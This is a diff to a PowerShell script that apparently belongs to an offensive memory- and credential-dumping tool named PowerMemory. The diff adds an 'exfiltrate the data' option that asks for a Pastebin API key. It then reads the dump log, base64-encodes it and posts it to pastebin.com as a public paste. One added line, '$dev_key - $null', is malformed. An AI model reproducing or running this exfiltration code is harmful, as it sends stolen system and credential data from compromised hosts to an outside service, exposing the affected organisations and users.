@@ -44,6 +44,7 @@ $osArchitecture = ""
 $operatingSystem = ""
 $server = ""
 $elevate = 0
+$dev_key - $null
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
@@ -98,13 +99,13 @@ if($adminFlag -eq $false){
     #}
 }
 Write-Host "================================================================================================"
-$remoteLocalFile = Read-Host 'Do you want use Active Directory cmdlets ?
+$activeDirectoryOrNot = Read-Host 'Do you want use Active Directory cmdlets ?
 1) Yes
 2) No
 0) Exit
 
 Enter menu number and press <ENTER>'
-switch ($remoteLocalFile){
+switch ($activeDirectoryOrNot){
     "1" {$adFlag = 1}
     "2" {$adFlag = 0}
     "Yes" {$adFlag = 1}
@@ -129,6 +130,30 @@ switch ($remoteLocalFile){
     "0" {Stop-Script}
     "m" {cls;White-MakeMeASandwich;Stop-Script}
     default {Write-Output "The option could not be determined... generate local dump"}
+}
+
+$exFiltrate = Read-Host 'Do you want exfiltrate the data (pastebin) ?
+1) Yes
+2) No
+0) Exit
+
+Enter menu number and press <ENTER>'
+switch ($exFiltrate){
+    "1" {$exFiltrate = 1}
+    "2" {$exFiltrate = 0}
+    "Yes" {$exFiltrate = 1}
+    "No" {$exFiltrate = 0}
+    "Y" {$exFiltrate = 1}
+    "N" {$exFiltrate = 0}
+    "0" {Stop-Script}    
+    default {Write-Output "The option could not be determined... Exfiltration will be not used";$exFiltrate = "0"}
+}
+if($exFiltrate -eq 1) {
+    $devKey = Read-Host 'What is your dev_key API (pastebin) ?
+
+    Enter your dev_key and press API <ENTER>'
+
+    $dev_key = $devKey
 }
 
 Set-ActiveDirectoryInformations $adFlag
@@ -587,4 +612,15 @@ Remove-Item -Recurse -Force c:\symbols
 Write-Progress -Activity "Write informations in the log file" -status "Running..." -id 1
 End-Log -streamWriter $global:streamWriter
 notepad $logPathName
+
+if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {    
+    Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
+    $dataToExfiltrate = Get-Content $logPathName
+    $utfEncodedBytes  = [System.Text.Encoding]::UTF8.GetBytes($dataToExfiltrate)
+    $pasteValue = [System.Convert]::ToBase64String($utfEncodedBytes)
+    $pasteName = "PowerMemory (Follow the White Rabbit)"    
+    $url = "https://pastebin.com/api/api_post.php"
+    $parameters = "&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
+    Post-HttpRequest $url $parameters
+}
 cls
